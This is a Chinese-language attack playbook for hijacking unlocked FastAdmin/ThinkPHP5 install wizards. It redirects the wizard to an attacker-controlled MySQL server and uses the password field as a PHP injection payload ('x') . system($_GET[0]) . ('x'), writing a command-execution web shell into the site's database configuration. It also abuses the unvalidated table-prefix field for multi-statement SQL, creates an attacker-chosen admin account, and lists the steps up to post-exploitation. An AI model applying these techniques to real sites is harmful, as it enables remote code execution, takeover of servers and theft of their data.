# 重装落库:指向自有真库(配置写注入 / 建管理员)

> 活体安装向导(无 lock)可被指向一台**完全掌控的真 MySQL**;把整条安装跑完,目标站配置切到自有库,
> 「配置写入」处若为拼接实现即兑现 RCE。验证载体:FastAdmin/ThinkPHP5 二开族;其它族先读源码再套。
> 姊妹篇:`fake-mysql-hijack.md`(假库 mimic 线)。

## 0. 选线

| 线 | 适用 |
|---|---|
| 假库 mimic(`fake-mysql-hijack.md`) | 只需安装器「以为成功」/ 观测它发什么请求 |
| **本线:真库重定向** | 要真收成 —— 站点注册到自有库(业务数据可读可写)+ 安装器在自有库建管理员(凭据自选)+ 配置写入点兑现注入 |

收成优先级:① 配置写 PHP 注入 → RCE;② 安装器自建 admin 登活体后台 → 面板内找 RCE 原语;③ 有 prefix 字段时的多语句 SQL 原语。

## 1. 读源码定契约(先于一切写请求)

- 搜源码:GitHub 按产品后台标题/独有类名/函数名搜;FastAdmin 二开全套常可直接 clone。
- 安装逻辑:`application/admin/command/Install.php`(`public/install.php` 常只是路由器)。
- 钉死四件事:
  1. 步骤与请求形态(单 POST 全流程 vs 多步 AJAX)+ 全部字段名;
  2. 写入目标:.env(字符串解析,**无代码执行**)**或** `application/database.php`(PHP 代码,可注入);
  3. 有无 prefix/mysqlPrefix 字段及其校验;
  4. 成功副作用:rename admin.php、install.lock、响应中的 adminName。
- 红线:分析完前不发任何「完整参数」POST(单 POST 设计会直接执行全流程)。

## 2. 前置核验清单

- [ ] 自有库:账号可连、有 CREATE 权限、库名**全新**(目标库已存在 ⇒ 安装卡「创建数据库」步中止)。
- [ ] 文案分层写死对照:「数据库权限不足，无法创建数据库」= 我方库权限;「连接类失败」(冒号后为空)= 连不上/凭据/库名。
- [ ] 端口:表单无 port 字段 ⇒ 自有库必须听 3306;公网可达先自测。
- [ ] 授权 host:用 @'%' 或显式加目标源 IP;症状对照 = 「凭据本机可连、目标报连接失败」⇒ 查授权 host 粒度/防火墙,去服务端核实后再判凭据对错。
- [ ] 认证插件:目标 PHP 旧(≤7.3 mysqlnd)不支持 MySQL8 `caching_sha2_password`(报 [2054]);给目标用的账号用 `mysql_native_password`。
- [ ] 恢复预案:原配置值已存档(debug 报错页的 PDO DSN/args = 活体配置);恢复通道已定(RCE 后自改/面板)。**目标库已存在 ⇒ 无法重装写回**,没通道别开火。

## 3. 密码即 payload

配置文件里 host/user/db 必须功能正确;password 是唯一自由字段。
做法:在自有 MySQL 建专用账号,**把该账号密码 SET 成 payload 字符串本身** —— 安装器连接成功(密码就是它),配置写入时 payload 原样落地。

PHP 单引号拼接语境 payload:

```
x') . system($_GET[0]) . ('x
```

落地行示例(模板把值单引号包裹塞进 `Env::get(..., '<值>'),`):

```php
Env::get('database.password', 'x') . system($_GET[0]) . ('x'),
```

= 合法表达式,配置文件每次加载即执行(验证:请求带 `?0=<命令>` 回输出)。

- ★ 文件必须保持**可解析**:payload 内未配平的 `;`/括号/引号截断数组 = parse error = 代码永不执行且站点全挂。
- ★ **双用途**:该字符串同时是正确密码 —— 写入路径安全(.env 无执行)时站点照常工作,回退线(安装器建的 admin)不受影响;失败不比成功差。

## 4. FastAdmin 经典 Install.php 两个源码级原语

(以实际拉到源码为准;二开可能改写 —— 改写过按改写后代码重新推)

### 4a. mysqlPrefix → 多语句 SQL

```
str_replace("`fa_", "`{prefix}", $sql)   # 无校验;替换进整份 SQL
$pdo->exec($sql)                          # 多语句,顺序执行
```

- 特性:**第一个出错语句之后的跳过,之前的已提交** ⇒ 关键动作放前面;前缀替换在**每处** `` `fa_ `` 重复出现 ⇒ 用 `INSERT IGNORE` 等幂等写法。
- 前提:须能走到导入步(建库/连接先过);库已存在时的中止逻辑先读源码确认。

### 4b. 配置写 → PHP 注入

- `preg_replace_callback` 类实现把 POST 值**单引号包裹、不转义**写进 `application/database.php`。
- payload 见 §3;触发 = 之后任何一次加载该配置的请求。

## 5. 收尾清单(开火后立刻做)

1. 捕获响应:成功文案 + `adminName`(改名后入口)+ 是否上锁。
2. RCE 验证(专发一发标记请求)。
3. **配置改回原值**(用存档原件);admin.php 如被改名按需改回原名。
4. 复核站点恢复:正常页 + 后台登录页回来。
5. 转正式后渗透(此时 = 目标箱 shell)。

## 6. 核验与误判

- oracle 真伪:垃圾 host 必须失败 + 用**自己独立验证过**的凭据复现 success,才算证明「目标→我方库」链路;输入无差分(啥都 success/啥都 fail 且不随输入变)= 桩或被墙,别单凭一发下结论。
- 同凭据随来源结果相反 ⇒ 先查 MySQL 授权 host 粒度(`@'%'` vs `@'特定IP'`)/防火墙,服务端侧核实。
- 全程凭据掩码:真实凭据不写进 payload/报告;报告只写字段与结论。
